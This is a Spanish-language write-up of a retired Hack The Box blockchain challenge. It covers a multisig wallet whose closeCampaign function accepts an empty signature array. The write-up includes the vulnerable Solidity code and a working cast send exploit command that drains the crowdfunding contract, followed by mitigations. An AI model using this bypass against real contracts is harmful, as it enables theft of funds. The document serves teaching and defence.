---
challenge: Funds Secured
type: Blockchain
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [blockchain, solidity, multisig, access-control, crowdfunding]
---

# Funds Secured — Hack The Box (Challenge)

[🌐 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flag real.

## TL;DR

Una wallet multifirma exige seis firmas del consejo para cerrar una campaña, pero no valida que la lista de firmas tenga un tamaño mínimo. Al enviar una lista vacía se salta el bucle y se ejecuta `closeCampaign`, que destruye el contrato y transfiere los fondos.

## Enunciado y superficie

- Blockchain, Easy, retirado.
- Se entregan `Campaign.sol`, `Setup.sol` y la librería ECDSA.
- La instancia publica RPC, clave del jugador y direcciones de `Setup`, `Crowdfunding` y `CouncilWallet`.

```bash
nc <HOST> <PORT>
cast call <SETUP> "isSolved() (bool)"
```

## Reconocimiento

- `Crowdfunding` guarda 1100 ether y solo el propietario puede cerrar la campaña.
- El propietario es `CouncilWallet`.
- `CouncilWallet.closeCampaign(bytes[] signatures, address to, address crowdfundingContract)` verifica firmas de los once miembros.
- `isSolved` comprueba que el balance de `Crowdfunding` sea cero.

## Análisis del contrato

```solidity
function closeCampaign(bytes[] memory signatures, address to, address payable crowdfundingContract) public {
    address[] memory voters = new address[] (signatures.length);
    bytes32 data = keccak256(abi.encode(to));

    for (uint256 i = 0; i < signatures.length; i++) {
        address signer = data.toEthSignedMessageHash().recover(signatures[i]);
        require(signer != address(0), "Invalid signature");
        require(_contains(councilMembers, signer), "Not council member");
        require(!_contains(voters, signer), "Duplicate signature");
        voters[i] = signer;
        if (i > 5) break;
    }

    Crowdfunding(crowdfundingContract).closeCampaign(to);
}
```

La comprobación de umbral está implícita en el bucle. Si `signatures.length == 0`, el bucle no se ejecuta y la llamada final se realiza igualmente.

## Explicación del fallo

La wallet confunde “recorrer firmas” con “exigir seis firmas”. No hay una comprobación explícita de `signatures.length >= 6` ni de que las firmas correspondan a la campaña correcta. El destinatario `to` y el contrato de crowdfunding son parámetros controlados por el llamador.

## Explotación

1. Llamar a `closeCampaign` desde `CouncilWallet`.
2. Pasar un array de firmas vacío.
3. Usar `CouncilWallet` como destinatario y la dirección de `Crowdfunding` como contrato.
4. `selfdestruct` vacía el balance y `isSolved` pasa a `true`.

```bash
cast send <WALLET> \
  "closeCampaign(bytes[],address,address)" \
  '[]' <WALLET> <CROWDFUNDING> \
  --private-key <PRIVATE_KEY>
```

## Evidencia

- Balance inicial de `Crowdfunding`.
- Llamada con array vacío.
- Balance final cero y `isSolved` verdadero.
- Flag redactada.

## Lecciones aprendidas

- Un bucle sobre una lista no implementa un umbral.
- Los parámetros `to` y `contract` también forman parte de la superficie.
- `selfdestruct` no debe quedar expuesto por una comprobación incompleta.

## Mitigaciones y detección

- Exigir explícitamente el número mínimo de firmas y unicidad.
- Incluir la dirección del contrato y la cadena en el mensaje firmado.
- Evitar `selfdestruct` en lógica de negocio.
- Monitorizar cierres de campaña con listas vacías o parámetros inesperados.

## Referencias

- <https://www.hackthebox.com/challenges/Funds%20Secured>
- <https://docs.openzeppelin.com/contracts/5.x/api/utils/cryptography#ECDSA>
- <https://swcregistry.io/docs/SWC-105>
